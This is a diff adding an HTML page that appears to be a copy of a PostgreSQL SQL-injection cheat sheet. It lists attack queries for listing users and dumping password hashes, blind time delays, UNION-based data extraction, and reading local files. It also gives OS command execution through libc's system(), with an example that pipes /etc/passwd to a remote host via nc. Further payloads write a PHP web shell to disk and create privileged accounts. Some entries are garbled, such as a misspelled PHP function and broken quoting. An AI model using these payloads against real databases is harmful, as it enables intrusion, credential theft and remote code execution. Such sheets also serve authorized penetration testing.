@@ -1,0 +1,186 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Queries</title>
+</head><body>Some can only be run by admin, marked by * or -priv<br/>
+<br/>
+Version 				SELECT version()<br/>
+Comments 			SELECT 1; –comment<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT /*comment*/1;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Current User 			SELECT user;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT current_user;</li>
+<li style="list-style-type: none"> SELECT session_user;</li>
+<li style="list-style-type: none"> SELECT usename FROM pg_user;</li>
+<li style="list-style-type: none"> SELECT getpgusername();</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Users 			SELECT usename FROM pg_user<br/>
+List Password Hashes 	SELECT usename, passwd FROM pg_shadow — priv<br/>
+List Privileges 		SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user<br/>
+List DBA Accounts 		SELECT usename FROM pg_user WHERE usesuper IS TRUE<br/>
+Current Database 		SELECT current_database()<br/>
+List Databases 		SELECT datname FROM pg_database<br/>
+List Columns 			SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)<br/>
+List Tables 			SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)<br/>
+Find Tables From Column Name 	<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">If you want to list all the table names that contain a column LIKE ‘%password%’:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Select Nth Row 		SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; — rows numbered from 0<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Select Nth Char 		SELECT substr(‘abcd’, 3, 1); — returns c<br/>
+Bitwise AND 			SELECT 6 &amp; 2; — returns 2<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT 6 &amp; 1; –returns 0</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+ASCII Value -&gt; Char 	SELECT chr(65);<br/>
+Char -&gt; ASCII Value 	SELECT ascii(‘A’);<br/>
+Casting 				SELECT CAST(1 as varchar);<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT CAST(’1′ as int);</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+String Concatenation 	SELECT ‘A’ || ‘B’; — returnsAB<br/>
+If Statement 			IF statements only seem valid inside functions, so aren’t much use for SQL injection. See CASE statement instead.<br/>
+Case Statement 		SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; — returns A<br/>
+Avoiding Quotes 		SELECT CHR(65)||CHR(66); — returns AB<br/>
+Time Delay 			SELECT pg_sleep(10); — postgres 8.2+ only<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6′, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10); –priv, create your own sleep function. Taken from here .</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Make DNS Requests 	Generally not possible in postgres. However if contrib/dblinkis installed (it isn’t by default) it can be used to resolve hostnames (assuming you have DBA rights):<br/>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT * FROM dblink('host=put.your.hostname.here user=someuser dbname=somedb', 'SELECT version()') RETURNS (result TEXT);</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Command Execution 	CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT; — priv<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080′); — priv, commands run as postgres/pgsql OS-level user</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Local File Access 		CREATE TABLE mydata(t text);<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> COPY mydata FROM ‘/etc/passwd’; — priv, can read files which are readable by postgres OS-level user</li>
+<li style="list-style-type: none"> …’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; — get data back one row at a time</li>
+<li style="list-style-type: none"> …’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2; — get data back one row at a time …</li>
+<li style="list-style-type: none"> DROP TABLE mytest mytest;Write to a file:</li>
+<li style="list-style-type: none"> CREATE TABLE mytable (mycol text);</li>
+<li style="list-style-type: none"> INSERT INTO mytable(mycol) VALUES (‘&lt;? pasthru($_GET[cmd]); ?&gt;’);</li>
+<li style="list-style-type: none"> COPY mytable (mycol) TO ‘/tmp/test.php’; –priv, write files as postgres OS-level user. Generally you won’t be able to write to the web root, but it’s always work a try. – priv user can also read/write files by <a href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf">mapping libc functions</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Hostname, IP Address 	SELECT inet_server_addr(); — returns db server IP address (or null if using local connection)<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT inet_server_port(); — returns db server IP address (or null if using local connection)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Create Users 			CREATE USER test1 PASSWORD ‘pass1′; — priv<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> CREATE USER test1 PASSWORD ‘pass1′ CREATEUSER; — priv, grant some privs at the same time</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Drop Users 			DROP USER test1; — priv<br/>
+Make User DBA 		ALTER USER test1 CREATEUSER CREATEDB; — priv<br/>
+Location of DB files 	SELECT current_setting(‘data_directory’); — priv<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT current_setting(‘hba_file’); — priv</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Default/System <br/>
+Databases 			template0<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> template1</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</body></html>
